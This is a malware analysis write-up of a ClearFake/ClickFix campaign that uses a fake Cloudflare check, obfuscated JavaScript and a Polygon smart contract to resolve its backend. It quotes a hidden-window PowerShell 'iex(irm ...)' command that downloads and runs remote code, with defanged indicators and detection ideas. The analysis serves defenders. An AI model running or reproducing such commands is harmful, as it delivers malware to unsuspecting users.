# ClearFake and ClickFix Using Polygon RPC — Infection Chain Analysis

ClickFix campaigns increasingly combine traditional social engineering with techniques designed to make attacker infrastructure more difficult to identify and block. One such mechanism is the use of public blockchain RPC nodes and smart contracts to dynamically store campaign configuration.

During the analysis of a compromised website, I identified a mechanism characteristic of ClearFake and ClickFix campaigns. The website displayed a fake verification panel styled to resemble Cloudflare and attempted to persuade the user to manually execute a PowerShell command.

A key element of this campaign was the use of the Polygon network. Public Polygon RPC nodes acted as an intermediary layer through which malicious JavaScript retrieved the current address of the next-stage infrastructure from a smart contract.

## Campaign Execution Chain

The analyzed infection chain was as follows:

```text
visit to a compromised website
        ↓
execution of obfuscated JavaScript
        ↓
requests to public Polygon RPC nodes
        ↓
retrieval of configuration from a smart contract
        ↓
retrieval of the campaign backend address
        ↓
display of a fake Cloudflare verification panel
        ↓
attempt to persuade the user to execute PowerShell
```

The entry point was a legitimate but likely compromised website.

After visiting the website, the user was shown a page resembling a Cloudflare verification mechanism. It contained messages similar to:

```text
Human Verification
Complete the steps below
Perform the steps on your keyboard
```

<img width="756" height="375" alt="fake-cloudflare-verification" src="https://github.com/user-attachments/assets/4265f94f-2bff-4fc1-8333-be3c6d33740e" />

*Figure 1. Fake verification mechanism used in the ClickFix campaign.*

This was not a legitimate CAPTCHA verification process. It was a ClickFix social-engineering mechanism.

## What Is the ClickFix Technique?

ClickFix relies on convincing users that they must manually perform a series of actions to resolve an alleged technical issue, complete a verification process, or unlock access to a website.

The user is typically instructed to:

1. open the Windows Run dialog using `Windows + R`,
2. paste the contents of the clipboard,
3. press Enter.

In reality, the website has already placed a PowerShell command or another system command into the clipboard. The user therefore becomes the person who directly executes the first stage of the infection.

This approach may allow attackers to bypass some security controls that focus primarily on files being automatically downloaded and executed by a web browser.

## PowerShell Command Presented to the User

In the analyzed campaign variant, the fake verification process prepared the following PowerShell command:

```powershell
powershell -w h "iex(irm 'idverification-cdn[.]info/e91c170d84482cdb' -UseBasicParsing)"; exit <#Verification ID: e91c170d84482cdb#>
```

The command contains several characteristic elements.

### `powershell -w h`

The `-w h` parameter is an abbreviated form of:

```powershell
-WindowStyle Hidden
```

It launches PowerShell with its console window hidden from the user.

### `irm`

The `irm` command is an alias for:

```powershell
Invoke-RestMethod
```

In this case, it was used to retrieve content from a remote server:

```text
idverification-cdn[.]info/e91c170d84482cdb
```

### `iex`

The `iex` command is an alias for:

```powershell
Invoke-Expression
```

Its purpose is to execute the retrieved content as PowerShell code.

The entire mechanism can be simplified as follows:

```text
download a script from the Internet
        ↓
pass its contents to Invoke-Expression
        ↓
execute the code directly within the PowerShell process
```

This does not mean that no files can be written to disk at later stages of the attack. However, the first stage may be executed without downloading an obvious standalone installer or executable file.

## Obfuscated JavaScript Embedded in the Website

The website source code contained an obfuscated JavaScript payload placed between the following markers:

```html
<!-- wpmbchik -->
...
<!-- /wpmbchik -->
```

<img width="1058" height="197" alt="obfuscated-javascript" src="https://github.com/user-attachments/assets/1ca4cd56-9468-4f96-8ce7-8a1a8f4444e8" />

*Figure 2. Obfuscated JavaScript embedded in the compromised website.*

The script contained an array of numerical values. The data was decoded using an XOR operation with the value `30` and then dynamically executed using:

```javascript
new Function(...)
```

The `new Function()` constructor creates a function from a string. In this case, it hindered static analysis because the actual program logic was not directly visible in the HTML source.

The main execution stages could only be reconstructed after deobfuscating the script.

The malicious JavaScript:

1. checked whether it had already been executed during the current browser session,
2. defined the campaign identifier,
3. prepared a list of public Polygon RPC nodes,
4. sent an `eth_call` request to a specified smart contract,
5. extracted the address of the next-stage infrastructure from the response,
6. loaded another script from the `/api.php?s=<campaign_id>` endpoint.

In the analyzed sample, the campaign identifier was:

```text
a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402
```

## Polygon RPC as an Intermediary Layer

<img width="747" height="609" alt="polygon-rpc" src="https://github.com/user-attachments/assets/353985b7-2078-4775-bd1d-590a8fbcde2c" />

*Figure 3. Public Polygon RPC nodes associated with the smart contract.*

One of the most interesting elements of the campaign was its use of public Polygon RPC nodes.

RPC, or Remote Procedure Call, allows applications to communicate with blockchain nodes. It can be used to read network state, query smart contract data, and submit transactions.

In the analyzed case, the browser did not perform a financial transaction. Instead, it sent a read-only JSON-RPC request of the following type:

```text
eth_call
```

The request targeted the following smart contract:

```text
0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2
```

The function selector used was:

```text
b68d1809
```

The mechanism operated as follows:

```text
user's browser
        ↓
public Polygon RPC node
        ↓
eth_call request
        ↓
smart contract
        ↓
retrieval of the current campaign backend address
        ↓
loading of /api.php?s=<campaign_id>
```

In this model, the smart contract acted as a dynamic infrastructure resolver. Instead of embedding the final destination domain directly in every script deployed on compromised websites, the operators could publish or update it in a single location.

As a result, changing the backend did not require the attackers to modify every compromised website again.

## Are Victim Queries Visible on Polygonscan?

This is an important distinction.

`eth_call` requests are read-only. They do not modify blockchain state and are not recorded as standard on-chain transactions.

This means that communication between a victim's device and a public RPC node does not have to appear in Polygonscan as a separate transaction.

Transactions visible during analysis of the smart contract may primarily represent operator activity, such as:

* publishing new configuration,
* changing the infrastructure address,
* updating values stored by the contract,
* maintaining the mechanism used by the campaign.

Therefore, an address interacting with the contract should not automatically be interpreted as belonging to a victim device.

## Next-Stage Infrastructure

In the analyzed case, the following domain was used as part of the next-stage infrastructure:

```text
idverification-cdn[.]info
```

The website source code also referenced the following endpoint:

```text
hxxps[://]idverification-cdn[.]info/api[.]php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402
```

The same domain was later used in the PowerShell command presented to the user by the fake verification panel.

This indicates that the infrastructure supported at least two campaign components:

* delivery of the script responsible for displaying the ClickFix mechanism,
* delivery of content retrieved and executed by PowerShell.

## Technical Indicators

### Compromised Website

```text
Redacted
```

### Next-Stage Infrastructure

```text
idverification-cdn[.]info
```

### Public Polygon RPC Nodes Used by the Script

```text
polygon[.]drpc[.]org
polygon[.]lava[.]build
polygon-bor-rpc[.]publicnode[.]com
polygon-mainnet[.]gateway[.]tatum[.]io
polygon-public[.]nodies[.]app
polygon[.]gateway[.]tenderly[.]co
polygon[.]rpc[.]hypersync[.]xyz
polygon[.]therpc[.]io
```

### Smart Contract

```text
0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2
```

### Function Selector

```text
b68d1809
```

### Campaign Identifier

```text
a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402
```

### HTML Marker

```html
<!-- wpmbchik -->
```

### JavaScript Flag

```javascript
window['_6b30bec11f']
```

### Characteristic PowerShell Pattern

```powershell
powershell -w h "iex(irm 'idverification-cdn[.]info/<verification_id>' -UseBasicParsing)"
```

## Public Polygon RPC Nodes Are Not Standalone IOCs

Communication with Polygon RPC domains does not automatically indicate an infection.

Public RPC endpoints are used by legitimate applications, cryptocurrency wallets, Web3 services, financial platforms, and analytical tools. Blocking all such domains without considering the broader context may generate numerous false positives and disrupt legitimate business activity.

In the analyzed case, the malicious nature of the event was established through the combination of several elements:

* a visit to a compromised website,
* the presence of obfuscated JavaScript,
* use of a smart contract as an infrastructure resolver,
* loading of code from `idverification-cdn[.]info`,
* display of a fake Cloudflare verification panel,
* generation of a command using `IEX` and `IRM`,
* an attempt to persuade the user to manually execute PowerShell.

It is the complete context of the event, rather than an individual network connection, that allows the website to be classified as part of a genuine ClickFix campaign.

## Why Is This Mechanism Effective?

The campaign combines several techniques that make it more resilient to analysis and infrastructure blocking.

### Compromise of a Legitimate Website

Users may trust the website because it operates under a legitimate domain that may previously have had a good reputation.

### JavaScript Obfuscation

The actual logic is hidden within encoded values and reconstructed only at runtime.

### Use of Public RPC Infrastructure

Traffic is directed to legitimate and widely available services, making broad blocking impractical.

### Dynamic Configuration Stored in a Smart Contract

The backend address can be changed without modifying the code embedded in every compromised website.

### Cloudflare Impersonation

The familiar appearance of the verification panel increases the credibility of the instructions.

### Manual Command Execution by the User

Instead of relying on a traditional automatic download, the campaign persuades the user to execute the command manually.

## Detection Opportunities

Effective detection of this campaign should not rely exclusively on public RPC node domains.

Higher-value correlations may include:

* execution of `powershell.exe` by `explorer.exe`,
* use of parameters that hide the PowerShell window,
* the presence of `Invoke-Expression` or its `iex` alias,
* the presence of `Invoke-RestMethod` or its `irm` alias,
* PowerShell execution shortly after visiting a suspicious website,
* clipboard content copied by a browser script,
* connections to newly registered or low-reputation domains,
* requests to paths such as `/api.php?s=<campaign_id>`,
* JSON-RPC requests referencing a specific smart contract and function selector,
* the presence of the `wpmbchik` marker in website source code.

Correlating browser telemetry, PowerShell process activity, and network traffic within a short time window is likely to provide particularly strong detection value.

## Summary

The analyzed case represented genuine exposure to a ClearFake and ClickFix campaign rather than a false-positive detection caused solely by communication with legitimate Polygon RPC domains.

The most significant technical element was the use of a smart contract as a dynamic source of campaign configuration. Public RPC nodes allowed malicious JavaScript to retrieve the current address of the next-stage infrastructure.

The user was then shown a fake Cloudflare panel designed to persuade them to manually execute a PowerShell command that downloaded and ran remote code.

This case demonstrates that blockchain infrastructure can be used not only for payments or asset transfers but also as a resilient and dynamic distribution layer for malicious campaign configuration.

From a security operations perspective, analysis of the complete event chain is essential. Traffic to Polygon RPC alone is not sufficient evidence of compromise. Only correlation with the website source code, browser behavior, next-stage infrastructure, and PowerShell execution allows the activity to be assessed correctly.

## Disclaimer

This publication was prepared for educational, research, and professional-development purposes. It presents technical observations, methods, and conclusions based on materials available at the time of analysis.

It does not contain personal data, credentials, private communications, internal telemetry, confidential or proprietary information, or organization-specific infrastructure details. Any sensitive contextual details have been omitted or anonymized. Public technical indicators are included only where relevant and are defanged when appropriate.

Unless explicitly stated otherwise, this publication does not identify the source, owner, affected entity, or circumstances in which the analyzed material was obtained or observed. The findings reflect the available evidence and the scope defined for the analysis.
